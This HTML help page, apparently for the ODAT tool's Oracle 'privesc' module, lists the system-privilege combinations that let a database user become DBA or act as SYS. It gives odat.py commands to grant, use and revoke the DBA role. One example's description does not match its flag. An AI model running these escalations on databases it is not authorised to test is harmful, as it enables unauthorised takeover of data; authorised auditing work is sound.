<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>privesc</title>
</head><body>Become DBA with system privileges <br/>
This module allows you to gain privileged access (e.g. DBA) using <b><a href="https://docs.oracle.com/cd/E21901_01/timesten.1122/e21642/privileges.htm#TTSQL339">system privileges</a></b>&nbsp;given to Oracle user used to launch this module. It can be used to get all system privileges given to the current Oracle user also.<br/>
&nbsp;<br/>
With these following combinations of system privileges, the Oracle user can become DBA:<br/>
&nbsp;<ul><li><b>CREATE PROCEDURE</b>&nbsp;and EXECUTE ANY PROCEDURE : <b>SYS's privileges</b></li>
</ul>
<ul><li><b>CREATE ANY TRIGER</b>&nbsp;(and CREATE PROCEDURE) : <b>SYS's privileges</b></li>
</ul>
<ul><li><b>ANALYZE ANY</b>&nbsp;(and CREATE PROCEDURE) : <b>SYS's privileges</b></li>
</ul>
<ul><li><b>CREATE ANY INDEX</b>&nbsp;(and CREATE PROCEDURE) : <b>SYS's privileges</b></li>
</ul>
<ul><li><b>CREATE ANY PROCEDURE</b>&nbsp;only: it is possible to alter all Oracle users' passwords (e.g. SYS's password) using APEX_040200's privileges. The database needs to be restarted :-(</li>
</ul>
<ul><li>With this <i>privesc</i>&nbsp;module, you can give the DBA role to Oracle user used in this module (e.g. <i>$USER</i>). Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:</li>
</ul>
<br/>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --dba-with-create-any-trigger <br/>
<ul><li>&nbsp;Also, it is possible to execute SQL requests as SYS manually. Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:</li>
</ul>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --exec-with-execute-any-procedure 'GRANT dba TO $USER' <br/>
<ul><li>&nbsp;You can revoke the DBA role using the following command:</li>
</ul>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --revoke-dba-role <br/>
<ul><li>&nbsp;As a reminder, you can use the following command to see commands of this module:</li>
</ul>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h <br/>
<ul><li>&nbsp;The command <i>--get-detailed-privs</i>&nbsp;can be used to get system privileges and roles granted to Oracle user used to run this module. Also, it gets system privileges and roles given to roles granted to Oracle user.</li>
</ul>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-detailed-privs <br/>
<ul><li>&nbsp;To see privileges and roles given to the current Oracle user only, the command <i>--get-privs</i>&nbsp;must be used:</li>
</ul>
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-privs <br/>
<ul><li>&nbsp;Notice these 2 previous commands underlines system privileges that can be exploited by this module to gain privileged access.</li>
</ul>
&nbsp;</body></html>